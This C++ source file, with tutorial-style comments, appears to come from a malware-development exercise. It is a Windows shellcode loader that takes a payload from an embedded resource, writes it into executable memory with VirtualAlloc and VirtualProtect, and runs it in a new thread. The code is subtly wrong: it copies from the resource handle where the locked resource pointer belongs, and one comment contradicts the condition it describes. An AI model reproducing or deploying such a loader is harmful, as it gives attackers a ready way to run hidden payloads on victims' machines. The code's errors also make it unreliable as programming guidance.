//To create a resource file (.rc) it must be in the same folder and have the important information about the resources the exe will be using 


#include <windows.h>
#include <stdio.h>
#include <bits/stdc++.h>

#define SC_ICON 2600 //it is just like a code to import a resource file 
using namespace std;

int main(){

HRSRC shellcode = FindResourceW(NULL,MAKEINTRESOURCE(SC_ICON),RT_RCDATA
//   [in, optional] HMODULE hModule,
//   [in]           LPCSTR  lpName,
//   [in]           LPCSTR  lpType
);
//findresourceA is for ASCII chars while findResourceW is for UTF-16 encoding chars

HGLOBAL shellcode_handle = LoadResource(NULL,shellcode
//   [in, optional] HMODULE hModule,
//   [in]           HRSRC   hResInfo
);

//TO GET THE ACTUAL RESOURCE FROM THE RESOURCE FILE WE WILL HAVE TO USE LOCKRESOURCE() FUNCTION

LPVOID shellcode_payload = LockResource(shellcode_handle
//   [in] HGLOBAL hResData
);
//this will give us the actual resource file pointer to the shellcode

DWORD shellcode_size = SizeofResource(NULL,shellcode
//   [in, optional] HMODULE hModule,
//   [in]           HRSRC   hResInfo
);

// cout<<shellcode_size;
// Now we will have to allocate a virtual memory to the program to be able to write our shellcode there.
LPVOID memory_address = VirtualAlloc(NULL,shellcode_size,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE
//   [in, optional] LPVOID lpAddress,
//   [in]           SIZE_T dwSize,
//   [in]           DWORD  flAllocationType,
//   [in]           DWORD  flProtect
);
//now memory_address is the variable that will hold the allocated memory for our shellcode.

//loading the shellcode into the virtual allocated memory
RtlMoveMemory(memory_address,shellcode,shellcode_size
//   _Out_       VOID UNALIGNED *Destination,
//   _In_  const VOID UNALIGNED *Source,
//   _In_        SIZE_T         Length
);

//making the shellcode executable
DWORD old_protection = 0;
//the old_protrection provided to the memory area should be a DWORD pointer else it will not be changed.
BOOL flag = VirtualProtect(memory_address,shellcode_size,PAGE_EXECUTE_READ,&old_protection
//   [in]  PVOID  Address,
//   [in]  SIZE_T Size,
//   [in]  ULONG  NewProtection,
//   [out] PULONG OldProtection
);

//if the flag is 0 then the shellcode will be executed by creating a thread
if (flag!=0)
{
    HANDLE thr_handle = CreateThread(NULL, 0,(LPTHREAD_START_ROUTINE) memory_address,NULL,(DWORD)NULL,NULL
//   [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
//   [in]            SIZE_T                  dwStackSize,
//   [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
//   [in, optional]  __drv_aliasesMem LPVOID lpParameter,
//   [in]            DWORD                   dwCreationFlags,
//   [out, optional] LPDWORD                 lpThreadId
);

//Now we want the thread to be finish its execution first and then move onto the rest of the program code.
DWORD wait = WaitForSingleObject(thr_handle,INFINITE
//   [in] HANDLE hHandle,
//   [in] DWORD  dwMilliseconds
);
//giving a finite amount of seconds will result in waiting for a number of seconds for the execution of the thread handle


}

return 0;
}